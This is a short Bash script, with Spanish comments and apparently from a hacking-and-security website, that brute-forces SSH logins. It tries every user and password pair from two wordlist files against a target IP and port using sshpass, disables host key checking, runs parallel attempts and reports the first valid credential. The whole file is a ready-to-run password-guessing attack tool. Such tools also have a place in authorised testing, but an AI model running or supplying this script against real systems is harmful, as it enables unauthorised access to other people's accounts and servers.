#!/bin/bash
#
# Fuerza bruta inversa SSH - Versión compatible Bash 1.x
#
# Requiere: sshpass
# Uso: sh brutessh9.sh [IP] [Puerto]
#
# hackingyseguridad.com 2025
#

IP=${1:-127.0.0.1}
PORT=${2:-4098}
MAX_THREADS=2
THREAD_COUNT=0

test_ssh() {
    user=$1
    pass=$2
    if sshpass -p "$pass" ssh -o StrictHostKeyChecking=no \
       -o ConnectTimeout=5 -p $PORT $user@$IP exit 2>/dev/null; then
        echo ""
        echo "[+] Credencial valida: $user@$IP - Clave: $pass"
        killall sshpass 2>/dev/null
        exit 0
    fi
}

# Procesar archivos de usuarios y claves
while read password; do
    password=`echo $password | tr -d '\r'`
    while read user; do
        user=`echo $user | tr -d '\r'`
        THREAD_COUNT=`expr $THREAD_COUNT + 1`
        test_ssh "$user" "$password" &

        echo "$user" "$password"

        # Control de hilos usando expr para matemáticas
        if [ `expr $THREAD_COUNT % $MAX_THREADS` -eq 0 ]; then
            wait
        fi
    done < usuarios0.txt
done < claves0.txt

wait
echo ""
echo "[!] .."
